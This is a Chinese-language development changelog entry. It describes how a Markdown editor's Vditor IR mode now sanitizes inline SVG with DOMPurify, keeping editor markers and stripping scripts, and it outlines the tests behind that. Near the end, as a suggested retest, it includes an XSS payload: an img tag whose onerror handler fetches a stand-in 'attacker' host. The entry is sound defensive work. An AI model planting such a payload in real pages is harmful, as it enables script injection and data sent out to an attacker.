...
- 完结 ISS-168 编辑器部分：`WysiwygEditorPane`（IR 模式）的内联 `<svg>` 现在也能正常显示 + DOMPurify sanitize 安全（ISS-168 编辑器部分，DEC-103）。**根因**：ISS-168/169 修复的 `PreviewPane`（`Vditor.preview` 路径）有 `transform(html)` 钩子（`node_modules/vditor/src/ts/markdown/previewRender.ts:95-96`）可以在 `innerHTML = html` 之前 sanitize，但 IR 编辑器走完全不同的代码路径——`Vditor.setValue` 内部直接执行 `vditor.ir.element.innerHTML = lute.Md2VditorIRDOM(markdown)`（`vditor/src/index.ts:330`），不经过任何 transform 钩子。Vditor 类型声明里的 `IOptions.transform`（`vditor/dist/types/index.d.ts:601`）虽然在 d.ts 存在，但 vditor 源码中无任何使用点（grep 全 ts 目录仅 previewRender.ts 用到 `mergedOptions.transform`），仅 `IPreviewOptions.markdown.transform` 真实生效，因此**编辑器的 transform 钩子方案不可用**。**选定方案**：直接对 `ir.element.innerHTML` 用 `sanitizeForVditor` 后处理（与 ISS-168 PreviewPane 原始方案 A 同机制但时机为 IR DOM 写入后）。**关键安全依据**：用 DOMPurify 在 node jsdom 实测确认，`USE_PROFILES: { html: true, svg: true, svgFilters: true }` 模式下，DOMPurify 完整保留 Vditor IR 的内部标记（`data-type`/`data-block`/`data-folia-locked-index`/`vditor-ir__node--expand`/`vditor-ir__preview`/`vditor-ir__marker--*`），这些是 Lute.VditorIRDOM2Md 反序列化为 MD 必需的内部节点——同时保留 svg 子元素（`<rect>`/`<text>`/...）让用户的内联 SVG 配图在编辑器也正常显示，剥离 `<script>` / `onerror` / `javascript:` 等危险内容，不会二次转义已 Lute 转义过的 `&lt;`（代码块不回归）。**保存语义论证**：`getValue()` 内部调用 `lute.VditorIRDOM2Md(ir.element.innerHTML)`，由于 sanitize 保留所有 IR marker，MD 反序列化结果与 sanitize 前的 IR DOM 等价——含 svg 不含 script，保存不丢用户合法内容、不引入回归。**sanitize 时机**：`after()` 回调内 + 外部 setValue useEffect 内的 `requestAnimationFrame` 回调 + `input()` 回调入口（早于复杂表 compare 早返回，保证非复杂表场景也 sanitize）三个时点全覆盖；用 `sanitizingRef` 短时 ref 防止 sanitize 写 innerHTML 触发 Vditor 自身渲染回调造成的死循环。**新测试**：`WysiwygEditorPane.test.tsx` 3 个集成测试覆盖：① 编辑器初始化带 svg 的 source → after() 后 IR DOM 含 svg（保存 round-trip svg 不丢）；② 编辑器带危险 MD → after() 后 IR DOM 中 script/onerror 被剥离（保存 round-trip 不含 script）；③ input() 回调让用户输入后 IR DOM 内 svg 保留 + onerror 剥离。`sanitizeForVditor` 本身未改（ISS-168 的 6 个测试 + sanitizeService.test.ts 继续覆盖）。**真实 Tauri WebView 实测待桌面包复测**：建议按 PR 描述在桌面端用恶意 `<img src="x" onerror="fetch('http://attacker/')">` 测试块复测，确认 DOM 永远观察不到危险态，且复杂表格（ISS-120 `data-folia-locked` + `contenteditable=false` 锁定）编辑体验不回归。
